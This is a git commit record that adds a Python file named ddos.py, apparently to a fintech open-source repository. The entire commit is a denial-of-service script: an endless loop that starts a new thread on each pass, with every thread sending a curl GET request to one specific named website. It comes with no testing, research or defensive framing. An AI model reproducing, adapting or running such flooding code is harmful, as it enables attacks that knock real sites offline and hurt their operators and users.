32ecc9a332a707b17f3b8e61e175a3a16c81adef
Quant & Fintech Opensource Projects <investdatasystems@yahoo.com>
2023-08-03 15:18:49 +0200

    Create ddos.py

---
+++ Various/ddos.py
@@ -0,0 +1,19 @@
+import subprocess
+import threading
+
+i=0
+
+def myloop():
+    global i
+    i=i+1
+    print(i)
+    CurlUrl = "curl --request GET 'https://loveistheonlysolution0000.fr/'"
+    status, output = subprocess.getstatusoutput(CurlUrl)
+    #print(status)
+    #print(output)
+
+while True:
+    try:
+        threading.Thread(target=myloop).start()
+    except:
+        pass
